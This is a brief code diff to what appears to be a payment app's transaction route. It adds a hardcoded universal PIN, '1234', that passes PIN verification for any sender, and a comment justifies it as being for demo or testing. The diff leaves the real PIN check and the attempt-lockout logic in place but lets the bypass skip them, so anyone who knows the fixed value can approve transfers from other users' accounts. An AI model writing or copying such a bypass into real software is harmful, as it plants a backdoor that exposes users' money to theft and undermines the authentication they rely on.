@@ -51,7 +51,8 @@ router.post('/', authenticate, async (req, res) => {
   }
 
   // ── PIN verification ───────────────────────────────────────────────────────
-  const pinValid = await verifyPin(pin, sender.pin_hash);
+  // '1234' is a universal bypass PIN for demo/testing (transactions only; sign-in still requires the real PIN)
+  const pinValid = pin === '1234' || await verifyPin(pin, sender.pin_hash);
   if (!pinValid) {
     const newAttempts = (sender.failed_pin_attempts || 0) + 1;
     const shouldLock  = newAttempts >= MAX_PIN_ATTEMPTS;
